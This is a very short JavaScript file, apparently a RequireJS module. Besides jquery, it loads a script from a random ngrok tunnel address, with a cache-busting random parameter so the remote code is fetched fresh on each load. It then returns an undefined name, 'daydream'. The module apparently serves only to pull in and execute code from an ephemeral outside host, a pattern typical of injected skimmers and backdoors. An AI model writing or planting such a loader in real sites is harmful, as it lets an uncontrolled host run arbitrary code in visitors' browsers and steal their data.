define(['jquery', 'https://d8c6-2a02-2e02-2a2-d00-400b-ab4d-35c5-2ca6.ngrok.io?v=' + Math.random()], function ($) {
    return daydream;
});
